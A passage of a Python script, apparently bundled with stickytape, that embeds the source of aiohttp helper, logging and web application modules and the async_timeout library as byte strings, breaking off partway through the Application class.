_ipv6_regexb)\r\n\r\n\r\ndef is_ip_address(host: Optional[Union[str, bytes, bytearray, memoryview]]) -> bool:\r\n    return is_ipv4_address(host) or is_ipv6_address(host)\r\n\r\n\r\ndef next_whole_second() -> datetime.datetime:\r\n    """Return current time rounded up to the next whole second."""\r\n    return datetime.datetime.now(datetime.timezone.utc).replace(\r\n        microsecond=0\r\n    ) + datetime.timedelta(seconds=0)\r\n\r\n\r\n_cached_current_datetime = None  # type: Optional[int]\r\n_cached_formatted_datetime = ""\r\n\r\n\r\ndef rfc822_formatted_time() -> str:\r\n    global _cached_current_datetime\r\n    global _cached_formatted_datetime\r\n\r\n    now = int(time.time())\r\n    if now != _cached_current_datetime:\r\n        # Weekday and month names for HTTP date/time formatting;\r\n        # always English!\r\n        # Tuples are constants stored in codeobject!\r\n        _weekdayname = ("Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun")\r\n        _monthname = (\r\n            "",  # Dummy so we can use 1-based month numbers\r\n            "Jan",\r\n            "Feb",\r\n            "Mar",\r\n            "Apr",\r\n            "May",\r\n            "Jun",\r\n            "Jul",\r\n            "Aug",\r\n            "Sep",\r\n            "Oct",\r\n            "Nov",\r\n            "Dec",\r\n        )\r\n\r\n        year, month, day, hh, mm, ss, wd, *tail = time.gmtime(now)\r\n        _cached_formatted_datetime = "%s, %02d %3s %4d %02d:%02d:%02d GMT" % (\r\n            _weekdayname[wd],\r\n            day,\r\n            _monthname[month],\r\n            year,\r\n            hh,\r\n            mm,\r\n            ss,\r\n        )\r\n        _cached_current_datetime = now\r\n    return _cached_formatted_datetime\r\n\r\n\r\ndef _weakref_handle(info: "Tuple[weakref.ref[object], str]") -> None:\r\n    ref, name = info\r\n    ob = ref()\r\n    if ob is not None:\r\n        with suppress(Exception):\r\n            getattr(ob, name)()\r\n\r\n\r\ndef weakref_handle(\r\n    ob: object, name: str, timeout: float, loop: asyncio.AbstractEventLoop\r\n) -> Optional[asyncio.TimerHandle]:\r\n    if timeout is not None and timeout > 0:\r\n        when = loop.time() + timeout\r\n        if timeout >= 5:\r\n            when = ceil(when)\r\n\r\n        return loop.call_at(when, _weakref_handle, (weakref.ref(ob), name))\r\n    return None\r\n\r\n\r\ndef call_later(\r\n    cb: Callable[[], Any], timeout: float, loop: asyncio.AbstractEventLoop\r\n) -> Optional[asyncio.TimerHandle]:\r\n    if timeout is not None and timeout > 0:\r\n        when = loop.time() + timeout\r\n        if timeout > 5:\r\n            when = ceil(when)\r\n        return loop.call_at(when, cb)\r\n    return None\r\n\r\n\r\nclass TimeoutHandle:\r\n    """Timeout handle"""\r\n\r\n    def __init__(\r\n        self, loop: asyncio.AbstractEventLoop, timeout: Optional[float]\r\n    ) -> None:\r\n        self._timeout = timeout\r\n        self._loop = loop\r\n        self._callbacks = (\r\n            []\r\n        )  # type: List[Tuple[Callable[..., None], Tuple[Any, ...], Dict[str, Any]]]\r\n\r\n    def register(\r\n        self, callback: Callable[..., None], *args: Any, **kwargs: Any\r\n    ) -> None:\r\n        self._callbacks.append((callback, args, kwargs))\r\n\r\n    def close(self) -> None:\r\n        self._callbacks.clear()\r\n\r\n    def start(self) -> Optional[asyncio.Handle]:\r\n        timeout = self._timeout\r\n        if timeout is not None and timeout > 0:\r\n            when = self._loop.time() + timeout\r\n            if timeout >= 5:\r\n                when = ceil(when)\r\n            return self._loop.call_at(when, self.__call__)\r\n        else:\r\n            return None\r\n\r\n    def timer(self) -> "BaseTimerContext":\r\n        if self._timeout is not None and self._timeout > 0:\r\n            timer = TimerContext(self._loop)\r\n            self.register(timer.timeout)\r\n            return timer\r\n        else:\r\n            return TimerNoop()\r\n\r\n    def __call__(self) -> None:\r\n        for cb, args, kwargs in self._callbacks:\r\n            with suppress(Exception):\r\n                cb(*args, **kwargs)\r\n\r\n        self._callbacks.clear()\r\n\r\n\r\nclass BaseTimerContext(ContextManager["BaseTimerContext"]):\r\n    pass\r\n\r\n\r\nclass TimerNoop(BaseTimerContext):\r\n    def __enter__(self) -> BaseTimerContext:\r\n        return self\r\n\r\n    def __exit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> None:\r\n        return\r\n\r\n\r\nclass TimerContext(BaseTimerContext):\r\n    """Low resolution timeout context manager"""\r\n\r\n    def __init__(self, loop: asyncio.AbstractEventLoop) -> None:\r\n        self._loop = loop\r\n        self._tasks = []  # type: List[asyncio.Task[Any]]\r\n        self._cancelled = False\r\n\r\n    def __enter__(self) -> BaseTimerContext:\r\n        task = current_task(loop=self._loop)\r\n\r\n        if task is None:\r\n            raise RuntimeError(\r\n                "Timeout context manager should be used " "inside a task"\r\n            )\r\n\r\n        if self._cancelled:\r\n            raise asyncio.TimeoutError from None\r\n\r\n        self._tasks.append(task)\r\n        return self\r\n\r\n    def __exit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> Optional[bool]:\r\n        if self._tasks:\r\n            self._tasks.pop()\r\n\r\n        if exc_type is asyncio.CancelledError and self._cancelled:\r\n            raise asyncio.TimeoutError from None\r\n        return None\r\n\r\n    def timeout(self) -> None:\r\n        if not self._cancelled:\r\n            for task in set(self._tasks):\r\n                task.cancel()\r\n\r\n            self._cancelled = True\r\n\r\n\r\ndef ceil_timeout(delay: Optional[float]) -> async_timeout.Timeout:\r\n    if delay is None or delay <= 0:\r\n        return async_timeout.timeout(None)\r\n\r\n    loop = get_running_loop()\r\n    now = loop.time()\r\n    when = now + delay\r\n    if delay > 5:\r\n        when = ceil(when)\r\n    return async_timeout.timeout_at(when)\r\n\r\n\r\nclass HeadersMixin:\r\n\r\n    ATTRS = frozenset(["_content_type", "_content_dict", "_stored_content_type"])\r\n\r\n    _content_type = None  # type: Optional[str]\r\n    _content_dict = None  # type: Optional[Dict[str, str]]\r\n    _stored_content_type = sentinel\r\n\r\n    def _parse_content_type(self, raw: str) -> None:\r\n        self._stored_content_type = raw\r\n        if raw is None:\r\n            # default value according to RFC 2616\r\n            self._content_type = "application/octet-stream"\r\n            self._content_dict = {}\r\n        else:\r\n            self._content_type, self._content_dict = cgi.parse_header(raw)\r\n\r\n    @property\r\n    def content_type(self) -> str:\r\n        """The value of content part for Content-Type HTTP header."""\r\n        raw = self._headers.get(hdrs.CONTENT_TYPE)  # type: ignore[attr-defined]\r\n        if self._stored_content_type != raw:\r\n            self._parse_content_type(raw)\r\n        return self._content_type  # type: ignore[return-value]\r\n\r\n    @property\r\n    def charset(self) -> Optional[str]:\r\n        """The value of charset part for Content-Type HTTP header."""\r\n        raw = self._headers.get(hdrs.CONTENT_TYPE)  # type: ignore[attr-defined]\r\n        if self._stored_content_type != raw:\r\n            self._parse_content_type(raw)\r\n        return self._content_dict.get("charset")  # type: ignore[union-attr]\r\n\r\n    @property\r\n    def content_length(self) -> Optional[int]:\r\n        """The value of Content-Length HTTP header."""\r\n        content_length = self._headers.get(  # type: ignore[attr-defined]\r\n            hdrs.CONTENT_LENGTH\r\n        )\r\n\r\n        if content_length is not None:\r\n            return int(content_length)\r\n        else:\r\n            return None\r\n\r\n\r\ndef set_result(fut: "asyncio.Future[_T]", result: _T) -> None:\r\n    if not fut.done():\r\n        fut.set_result(result)\r\n\r\n\r\ndef set_exception(fut: "asyncio.Future[_T]", exc: BaseException) -> None:\r\n    if not fut.done():\r\n        fut.set_exception(exc)\r\n\r\n\r\nclass ChainMapProxy(Mapping[str, Any]):\r\n    __slots__ = ("_maps",)\r\n\r\n    def __init__(self, maps: Iterable[Mapping[str, Any]]) -> None:\r\n        self._maps = tuple(maps)\r\n\r\n    def __init_subclass__(cls) -> None:\r\n        raise TypeError(\r\n            "Inheritance class {} from ChainMapProxy "\r\n            "is forbidden".format(cls.__name__)\r\n        )\r\n\r\n    def __getitem__(self, key: str) -> Any:\r\n        for mapping in self._maps:\r\n            try:\r\n                return mapping[key]\r\n            except KeyError:\r\n                pass\r\n        raise KeyError(key)\r\n\r\n    def get(self, key: str, default: Any = None) -> Any:\r\n        return self[key] if key in self else default\r\n\r\n    def __len__(self) -> int:\r\n        # reuses stored hash values if possible\r\n        return len(set().union(*self._maps))  # type: ignore[arg-type]\r\n\r\n    def __iter__(self) -> Iterator[str]:\r\n        d = {}  # type: Dict[str, Any]\r\n        for mapping in reversed(self._maps):\r\n            # reuses stored hash values if possible\r\n            d.update(mapping)\r\n        return iter(d)\r\n\r\n    def __contains__(self, key: object) -> bool:\r\n        return any(key in m for m in self._maps)\r\n\r\n    def __bool__(self) -> bool:\r\n        return any(self._maps)\r\n\r\n    def __repr__(self) -> str:\r\n        content = ", ".join(map(repr, self._maps))\r\n        return f"ChainMapProxy({content})"\r\n\r\n\r\n# https://tools.ietf.org/html/rfc7232#section-2.3\r\n_ETAGC = r"[!#-}\\x80-\\xff]+"\r\n_ETAGC_RE = re.compile(_ETAGC)\r\n_QUOTED_ETAG = fr\'(W/)?"({_ETAGC})"\'\r\nQUOTED_ETAG_RE = re.compile(_QUOTED_ETAG)\r\nLIST_QUOTED_ETAG_RE = re.compile(fr"({_QUOTED_ETAG})(?:\\s*,\\s*|$)|(.)")\r\n\r\nETAG_ANY = "*"\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass ETag:\r\n    value: str\r\n    is_weak: bool = False\r\n\r\n\r\ndef validate_etag_value(value: str) -> None:\r\n    if value != ETAG_ANY and not _ETAGC_RE.fullmatch(value):\r\n        raise ValueError(\r\n            f"Value {value!r} is not a valid etag. Maybe it contains \'\\"\'?"\r\n        )\r\n\r\n\r\ndef parse_http_date(date_str: Optional[str]) -> Optional[datetime.datetime]:\r\n    """Process a date string, return a datetime object"""\r\n    if date_str is not None:\r\n        timetuple = parsedate(date_str)\r\n        if timetuple is not None:\r\n            with suppress(ValueError):\r\n                return datetime.datetime(*timetuple[:6], tzinfo=datetime.timezone.utc)\r\n    return None\r\n')
    __stickytape_write_module('async_timeout/__init__.py', b'import asyncio\nimport enum\nimport sys\nimport warnings\nfrom types import TracebackType\nfrom typing import Any, Optional, Type\n\n\nif sys.version_info >= (3, 8):\n    from typing import final\nelse:\n    from typing_extensions import final\n\n\n__version__ = "4.0.2"\n\n\n__all__ = ("timeout", "timeout_at", "Timeout")\n\n\ndef timeout(delay: Optional[float]) -> "Timeout":\n    """timeout context manager.\n\n    Useful in cases when you want to apply timeout logic around block\n    of code or in cases when asyncio.wait_for is not suitable. For example:\n\n    >>> async with timeout(0.001):\n    ...     async with aiohttp.get(\'https://github.com\') as r:\n    ...         await r.text()\n\n\n    delay - value in seconds or None to disable timeout logic\n    """\n    loop = _get_running_loop()\n    if delay is not None:\n        deadline = loop.time() + delay  # type: Optional[float]\n    else:\n        deadline = None\n    return Timeout(deadline, loop)\n\n\ndef timeout_at(deadline: Optional[float]) -> "Timeout":\n    """Schedule the timeout at absolute time.\n\n    deadline argument points on the time in the same clock system\n    as loop.time().\n\n    Please note: it is not POSIX time but a time with\n    undefined starting base, e.g. the time of the system power on.\n\n    >>> async with timeout_at(loop.time() + 10):\n    ...     async with aiohttp.get(\'https://github.com\') as r:\n    ...         await r.text()\n\n\n    """\n    loop = _get_running_loop()\n    return Timeout(deadline, loop)\n\n\nclass _State(enum.Enum):\n    INIT = "INIT"\n    ENTER = "ENTER"\n    TIMEOUT = "TIMEOUT"\n    EXIT = "EXIT"\n\n\n@final\nclass Timeout:\n    # Internal class, please don\'t instantiate it directly\n    # Use timeout() and timeout_at() public factories instead.\n    #\n    # Implementation note: `async with timeout()` is preferred\n    # over `with timeout()`.\n    # While technically the Timeout class implementation\n    # doesn\'t need to be async at all,\n    # the `async with` statement explicitly points that\n    # the context manager should be used from async function context.\n    #\n    # This design allows to avoid many silly misusages.\n    #\n    # TimeoutError is raised immadiatelly when scheduled\n    # if the deadline is passed.\n    # The purpose is to time out as sson as possible\n    # without waiting for the next await expression.\n\n    __slots__ = ("_deadline", "_loop", "_state", "_timeout_handler")\n\n    def __init__(\n        self, deadline: Optional[float], loop: asyncio.AbstractEventLoop\n    ) -> None:\n        self._loop = loop\n        self._state = _State.INIT\n\n        self._timeout_handler = None  # type: Optional[asyncio.Handle]\n        if deadline is None:\n            self._deadline = None  # type: Optional[float]\n        else:\n            self.update(deadline)\n\n    def __enter__(self) -> "Timeout":\n        warnings.warn(\n            "with timeout() is deprecated, use async with timeout() instead",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        self._do_enter()\n        return self\n\n    def __exit__(\n        self,\n        exc_type: Optional[Type[BaseException]],\n        exc_val: Optional[BaseException],\n        exc_tb: Optional[TracebackType],\n    ) -> Optional[bool]:\n        self._do_exit(exc_type)\n        return None\n\n    async def __aenter__(self) -> "Timeout":\n        self._do_enter()\n        return self\n\n    async def __aexit__(\n        self,\n        exc_type: Optional[Type[BaseException]],\n        exc_val: Optional[BaseException],\n        exc_tb: Optional[TracebackType],\n    ) -> Optional[bool]:\n        self._do_exit(exc_type)\n        return None\n\n    @property\n    def expired(self) -> bool:\n        """Is timeout expired during execution?"""\n        return self._state == _State.TIMEOUT\n\n    @property\n    def deadline(self) -> Optional[float]:\n        return self._deadline\n\n    def reject(self) -> None:\n        """Reject scheduled timeout if any."""\n        # cancel is maybe better name but\n        # task.cancel() raises CancelledError in asyncio world.\n        if self._state not in (_State.INIT, _State.ENTER):\n            raise RuntimeError(f"invalid state {self._state.value}")\n        self._reject()\n\n    def _reject(self) -> None:\n        if self._timeout_handler is not None:\n            self._timeout_handler.cancel()\n            self._timeout_handler = None\n\n    def shift(self, delay: float) -> None:\n        """Advance timeout on delay seconds.\n\n        The delay can be negative.\n\n        Raise RuntimeError if shift is called when deadline is not scheduled\n        """\n        deadline = self._deadline\n        if deadline is None:\n            raise RuntimeError("cannot shift timeout if deadline is not scheduled")\n        self.update(deadline + delay)\n\n    def update(self, deadline: float) -> None:\n        """Set deadline to absolute value.\n\n        deadline argument points on the time in the same clock system\n        as loop.time().\n\n        If new deadline is in the past the timeout is raised immediatelly.\n\n        Please note: it is not POSIX time but a time with\n        undefined starting base, e.g. the time of the system power on.\n        """\n        if self._state == _State.EXIT:\n            raise RuntimeError("cannot reschedule after exit from context manager")\n        if self._state == _State.TIMEOUT:\n            raise RuntimeError("cannot reschedule expired timeout")\n        if self._timeout_handler is not None:\n            self._timeout_handler.cancel()\n        self._deadline = deadline\n        if self._state != _State.INIT:\n            self._reschedule()\n\n    def _reschedule(self) -> None:\n        assert self._state == _State.ENTER\n        deadline = self._deadline\n        if deadline is None:\n            return\n\n        now = self._loop.time()\n        if self._timeout_handler is not None:\n            self._timeout_handler.cancel()\n\n        task = _current_task(self._loop)\n        if deadline <= now:\n            self._timeout_handler = self._loop.call_soon(self._on_timeout, task)\n        else:\n            self._timeout_handler = self._loop.call_at(deadline, self._on_timeout, task)\n\n    def _do_enter(self) -> None:\n        if self._state != _State.INIT:\n            raise RuntimeError(f"invalid state {self._state.value}")\n        self._state = _State.ENTER\n        self._reschedule()\n\n    def _do_exit(self, exc_type: Optional[Type[BaseException]]) -> None:\n        if exc_type is asyncio.CancelledError and self._state == _State.TIMEOUT:\n            self._timeout_handler = None\n            raise asyncio.TimeoutError\n        # timeout has not expired\n        self._state = _State.EXIT\n        self._reject()\n        return None\n\n    def _on_timeout(self, task: "asyncio.Task[None]") -> None:\n        task.cancel()\n        self._state = _State.TIMEOUT\n        # drop the reference early\n        self._timeout_handler = None\n\n\nif sys.version_info >= (3, 7):\n\n    def _current_task(loop: asyncio.AbstractEventLoop) -> "Optional[asyncio.Task[Any]]":\n        return asyncio.current_task(loop=loop)\n\nelse:\n\n    def _current_task(loop: asyncio.AbstractEventLoop) -> "Optional[asyncio.Task[Any]]":\n        return asyncio.Task.current_task(loop=loop)\n\n\nif sys.version_info >= (3, 7):\n\n    def _get_running_loop() -> asyncio.AbstractEventLoop:\n        return asyncio.get_running_loop()\n\nelse:\n\n    def _get_running_loop() -> asyncio.AbstractEventLoop:\n        loop = asyncio.get_event_loop()\n        if not loop.is_running():\n            raise RuntimeError("no running event loop")\n        return loop\n')
    __stickytape_write_module('aiohttp/log.py', b'import logging\r\n\r\naccess_logger = logging.getLogger("aiohttp.access")\r\nclient_logger = logging.getLogger("aiohttp.client")\r\ninternal_logger = logging.getLogger("aiohttp.internal")\r\nserver_logger = logging.getLogger("aiohttp.server")\r\nweb_logger = logging.getLogger("aiohttp.web")\r\nws_logger = logging.getLogger("aiohttp.websocket")\r\n')
    __stickytape_write_module('aiohttp/web_app.py', b'import asyncio\r\nimport logging\r\nimport warnings\r\nfrom functools import partial, update_wrapper\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    AsyncIterator,\r\n    Awaitable,\r\n    Callable,\r\n    Dict,\r\n    Iterable,\r\n    Iterator,\r\n    List,\r\n    Mapping,\r\n    MutableMapping,\r\n    Optional,\r\n    Sequence,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom aiosignal import Signal\r\nfrom frozenlist import FrozenList\r\n\r\nfrom . import hdrs\r\nfrom .abc import (\r\n    AbstractAccessLogger,\r\n    AbstractMatchInfo,\r\n    AbstractRouter,\r\n    AbstractStreamWriter,\r\n)\r\nfrom .helpers import DEBUG\r\nfrom .http_parser import RawRequestMessage\r\nfrom .log import web_logger\r\nfrom .streams import StreamReader\r\nfrom .web_log import AccessLogger\r\nfrom .web_middlewares import _fix_request_current_app\r\nfrom .web_protocol import RequestHandler\r\nfrom .web_request import Request\r\nfrom .web_response import StreamResponse\r\nfrom .web_routedef import AbstractRouteDef\r\nfrom .web_server import Server\r\nfrom .web_urldispatcher import (\r\n    AbstractResource,\r\n    AbstractRoute,\r\n    Domain,\r\n    MaskDomain,\r\n    MatchedSubAppResource,\r\n    PrefixedSubAppResource,\r\n    UrlDispatcher,\r\n)\r\n\r\n__all__ = ("Application", "CleanupError")\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .typedefs import Handler\r\n\r\n    _AppSignal = Signal[Callable[["Application"], Awaitable[None]]]\r\n    _RespPrepareSignal = Signal[Callable[[Request, StreamResponse], Awaitable[None]]]\r\n    _Middleware = Union[\r\n        Callable[[Request, Handler], Awaitable[StreamResponse]],\r\n        Callable[["Application", Handler], Awaitable[Handler]],  # old-style\r\n    ]\r\n    _Middlewares = FrozenList[_Middleware]\r\n    _MiddlewaresHandlers = Optional[Sequence[Tuple[_Middleware, bool]]]\r\n    _Subapps = List["Application"]\r\nelse:\r\n    # No type checker mode, skip types\r\n    _AppSignal = Signal\r\n    _RespPrepareSignal = Signal\r\n    _Middleware = Callable\r\n    _Middlewares = FrozenList\r\n    _MiddlewaresHandlers = Optional[Sequence]\r\n    _Subapps = List\r\n\r\n\r\nclass Application(MutableMapping[str, Any]):\r\n    ATTRS = frozenset(\r\n        [\r\n            "logger",\r\n            "_debug",\r\n            "_router",\r\n            "_loop",\r\n            "_handler_args",\r\n            "_middlewares",\r\n            "_middlewares_handlers",\r\n            "_run_middlewares",\r\n            "_state",\r\n            "_frozen",\r\n            "_pre_frozen",\r\n            "_subapps",\r\n            "_on_response_prepare",\r\n            "_on_startup",\r\n            "_on_shutdown",\r\n            "_on_cleanup",\r\n            "_client_max_size",\r\n            "_cleanup_ctx",\r\n        ]\r\n    )\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        logger: logging.Logger = web_logger,\r\n        router: Optional[UrlDispatcher] = None,\r\n        middlewares: Iterable[_Middleware] = (),\r\n        handler_args: Optional[Mapping[str, Any]] = None,\r\n        client_max_size: int = 1024 ** 2,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        debug: Any = ...,  # mypy doesn\'t support ellipsis\r\n    ) -> None:\r\n        if router is None:\r\n            router = UrlDispatcher()\r\n        else:\r\n            warnings.warn(\r\n                "router argument is deprecated", DeprecationWarning, stacklevel=2\r\n            )\r\n        assert isinstance(router, AbstractRouter), router\r\n\r\n        if loop is not None:\r\n            warnings.warn(\r\n                "loop argument is deprecated", DeprecationWarning, stacklevel=2\r\n            )\r\n\r\n        if debug is not ...:\r\n            warnings.warn(\r\n                "debug argument is deprecated", DeprecationWarning, stacklevel=2\r\n            )\r\n        self._debug = debug\r\n        self._router = router  # type: UrlDispatcher\r\n        self._loop = loop\r\n        self._handler_args = handler_args\r\n        self.logger = logger\r\n\r\n        self._middlewares = FrozenList(middlewares)  # type: _Middlewares\r\n\r\n        # initialized on freezing\r\n        self._middlewares_handlers = None  # type: _MiddlewaresHandlers\r\n        # initialized on freezing\r\n        self._run_middlewares = None  # type: Optional[bool]\r\n\r\n        self._state = {}  # type: Dict[str, Any]\r\n        self._frozen = False\r\n        self._pre_frozen = False\r\n        self._subapps = []  # type: _Subapps\r\n\r\n        self._on_response_prepare = Signal(self)  # type: _RespPrepareSignal\r\n        self._on_startup = Signal(self)  # type: _AppSignal\r\n        self._on_shutdown = Signal(self)  # type: _AppSignal\r\n        self._on_cleanup = Signal(self)  # type: _AppSignal\r\n        self._cleanup_ctx = CleanupContext()\r\n        self._on_startup.append(self._cleanup_ctx._on_startup)\r\n        self._on_cleanup.append(self._cleanup_ctx._on_cleanup)\r\n        self._client_max_size = client_max_size\r\n\r\n    def __init_subclass__(cls: Type["Application"]) -> None:\r\n        warnings.warn(\r\n            "Inheritance class {} from web.Application "\r\n            "is discouraged".format(cls.__name__),\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n\r\n    if DEBUG:  # pragma: no cover\r\n\r\n        def __setattr__(self, name: str, val: Any) -> None:\r\n            if name not in self.ATTRS:\r\n                warnings.warn(\r\n                    "Setting custom web.Application.{} attribute "\r\n                    "is discouraged".format(name),\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n            super().__setattr__(name, val)\r\n\r\n    # MutableMapping API\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        return self is other\r\n\r\n    def __getitem__(self, key: str) -> Any:\r\n        return self._state[key]\r\n\r\n    def _check_frozen(self) -> None:\r\n        if self._frozen:\r\n            warnings.warn(\r\n                "Changing state of started or joined " "application is deprecated",\r\n                DeprecationWarning,\r\n                stacklevel=3,\r\n            )\r\n\r\n    def __setitem__(self, key: str, value: Any) -> None:\r\n        self._check_frozen()\r\n        self._state[key] = value\r\n\r\n    def __delitem__(self, key: str) -> None:\r\n        self._check_frozen()\r\n        del self._state[key]\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._state)\r\n\r\n    def __iter__(self) -> Iterator[str]:\r\n        return iter(self._state)\r\n\r\n    ########\r\n    @property\r\n    def loop(self) -> asyncio.AbstractEventLoop:\r\n        # Technically the loop can be None\r\n        # but we mask it by explicit type cast\r\n        # to provide more convinient type annotation\r\n        warnings.warn("loop property is deprecated", DeprecationWarning, stacklevel=2)\r\n        return cast(asyncio.AbstractEventLoop, self._loop)\r\n\r\n    def _set_loop(self, loop: Optional[asyncio.AbstractEventLoop]) -> None:\r\n        if loop is None:\r\n            loop = asyncio.get_event_loop()\r\n        if self._loop is not None and self._loop is not loop:\r\n            raise RuntimeError(\r\n                "web.Application instance initialized with different loop"\r\n            )\r\n\r\n        self._loop = loop\r\n\r\n        # set loop debug\r\n        if self._debug is ...:\r\n            self._debug = loop.get_debug()\r\n\r\n        # set loop to sub applications\r\n        for subapp in self._subapps:\r\n            subapp._set_loop(loop)\r\n\r\n    @property\r\n    def pre_frozen(self) -> bool:\r\n        return self._pre_frozen\r\n\r\n    def pre_freeze(self) -> None:\r\n        if self._pre_frozen:\r\n            return\r\n\r\n        self._pre_frozen = True\r\n        self._middlewares.freeze()\r\n        self._router.freeze()\r\n        self._on_response_prepare.freeze()\r\n        self._cleanup_ctx.freeze()\r\n        self._on_startup.freeze()\r\n        self._on_shutdown.freeze()\r\n        self._on_cleanup.freeze()\r\n        self._middlewares_handlers = tuple(self._prepare_middleware())\r\n\r\n        # If current app and any subapp do not have middlewares avoid run all\r\n        # of the code footprint that it implies, which have a middleware\r\n        # hardcoded per app that sets up the current_app attribute. If no\r\n        # middlewares are configured the handler will receive the proper\r\n        # current_app without needing all of this code.\r\n        self._run_middlewares = True if self.middlewares else False\r\n\r\n        for subapp in self._subapps:\r\n            subapp.pre_freeze()\r\n            self._run_middlewares = self._run_middlewares or subapp._run_middlewares\r\n\r\n    @property\r\n    def frozen(self) -> bool:\r\n        return self._frozen\r\n\r\n    def freeze(self) -> None:\r\n        if self._frozen:\r\n            return\r\n\r\n        self.pre_freeze()\r\n        self._frozen = True\r\n        for subapp in self._subapps:\r\n            subapp.freeze()\r\n\r\n    @property\r\n    def debug(self) -> bool:\r\n        warnings.warn("debug property is deprecated", DeprecationWarning, stacklevel=2)\r\n        return self._debug  # type: ignore[no-any-return]\r\n\r\n    def _reg_subapp_signals(self, subapp: "Application") -> None:\r\n        def reg_handler(signame: str) -> None:\r\n            subsig = getattr(subapp, signame)\r\n\r\n            async def handler(app: "Application") -> None:\r\n                await subsig.send(subapp)\r\n\r\n            appsig = getattr(self, signame)\r\n            appsig.append(handler)\r\n\r\n        reg_handler("on_startup")\r\n        reg_handler("on_shutdown")\r\n        reg_handler("on_cleanup")\r\n\r\n    def add_subapp(self, prefix: str, subapp: "Application") -> AbstractResource:\r\n        if not isinstance(prefix, str):\r\n            raise TypeError("Prefix must be str")\r\n        prefix = prefix.rstrip("/")\r\n        if not prefix:\r\n            raise ValueError("Prefix cannot be empty")\r\n        factory = partial(PrefixedSubAppResource, prefix, subapp)\r\n        return self._add_subapp(factory, subapp)\r\n\r\n    def _add_subapp(\r\n        self, resource_factory: Callable[[], AbstractResource], subapp: "Application"\r\n    ) -> AbstractResource:\r\n        if self.frozen:\r\n            raise RuntimeError("Cannot add sub application to frozen application")\r\n        if subapp.frozen:\r\n            raise RuntimeError("Cannot add frozen application")\r\n        resource = resource_factory()\r\n        self.router.register_resource(resource)\r\n        self._reg_subapp_signals(subapp)\r\n        self._subapps.append(subapp)\r\n        subapp.pre_freeze()\r\n        if self._loop is not None:\r\n            subapp._set_loop(self._loop)\r\n        return resource\r\n\r\n    def add_domain(self, domain: str, subapp: "Application") -> AbstractResource:\r\n        if not isinstance(domain, str):\r\n            raise TypeError("Domain must be str")\r\n        elif "*" in domain:\r\n            rule = MaskDomain(domain)  # type: Domain\r\n        else:\r\n            rule = Domain(domain)\r\n        factory = partial(MatchedSubAppResource, rule, subapp)\r\n        return self._add_subapp(factory, subapp)\r\n\r\n    def add_routes(self, routes: Iterable[AbstractRouteDef]) -> List[AbstractRoute]:\r\n        return self.router.add_routes(routes)\r\n\r\n    @property\r\n    def on_response_prepare(self) -> _RespPrepareSignal:\r\n        return self._on_response_prepare\r\n\r\n    @property\r\n    def on_startup(self) -> _AppSignal:\r\n        return self._on_startup\r\n\r\n    @property\r\n    def on_shutdown(self) -> _AppSignal:\r\n        return self._on_shutdown\r\n\r\n    @property\r\n    def on_cleanup(self) -> _AppSignal:\r\n        return self._on_cleanup\r\n\r\n    @property\r\n    def cleanup_ctx(self) -> "CleanupContext":\r\n        return self._cleanup_ctx\r\n\r\n    @property\r\n    def router(self) -> UrlDispatcher:\r\n        return self._router\r\n\r\n    @property\r\n    def middlewares(self) -> _Middlewares:\r\n        return self._middlewares\r\n\r\n    def _make_handler(\r\n        self,\r\n        *,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        access_log_class: Type[AbstractAccessLogger] = AccessLogger,\r\n        **kwargs: Any,\r\n    ) -> Server:\r\n\r\n        if not issubclass(access_log_class, AbstractAccessLogger):\r\n            raise TypeError(\r\n                "access_log_class must be subclass of "\r\n                "aiohttp.abc.AbstractAccessLogger, got {}".format(access_log_class)\r\n            )\r\n\r\n        self._set_loop(loop)\r\n        self.freeze()\r\n\r\n        kwargs["debug"] = self._debug\r\n        kwargs["access_log_class"] = access_log_class\r\n        if self._handler_args:\r\n            for k, v in self._handler_args.items():\r\n                kwargs[k] = v\r\n\r\n        return Server(\r\n            self._handle,  # type: ignore[arg-type]\r\n            request_factory=self._make_request,\r\n            loop=self._loop,\r\n            **kwargs,\r\n        )\r\n\r\n    def make_handler(\r\n        self,\r\n        *,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        access_log_class: Type[AbstractAccessLogger] = AccessLogger,\r\n        **kwargs: Any,\r\n    ) -> Server:\r\n\r\n        warnings.warn(\r\n            "Application.make_handler(...) is deprecated, " "use AppRunner API instead",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n\r\n        return self._make_handler(\r\n            loop=loop, access_log_class=access_log_class, **kwargs\r\n        )\r\n\r\n    async def startup(self) -> None:\r\n        """Causes on_startup signal\r\n\r\n        Should be called in the event loop along with the request handler.\r\n        """\r\n        await self.on_startup.send(self)\r\n\r\n    async def shutdown(self) -> None:\r\n        """Causes on_shutdown signal\r\n\r\n        Should be called before cleanup()\r\n        """\r\n        await self.on_shutdown.send(self)\r\n\r\n    async def cleanup(self) -> None:\r\n        """Causes on_cleanup signal\r\n\r\n        Should be called after shutdown()\r\n        """\r\n        if self.on_cleanup.frozen:\r\n            await self.on_cleanup.send(self)\r\n        else:\r\n            # If an exception occurs in startup, ensure cleanup contexts are completed.\r\n            await self._cleanup_ctx._on_cleanup(self)\r\n\r\n    def _make_request(\r\n        self,\r\n        message: RawRequestMessage,\r\n        payload: StreamReader,\r\n        protocol: RequestHandler,\r\n        writer: AbstractStreamWriter,\r\n        task: "asyncio.Task[None]",\r\n        _cls: Type[Request] = Request,\r\n    ) -> Request:\r\n        return _cls(\r\n            message,\r\n            payload,\r\n            protocol,\r\n            writer,\r\n            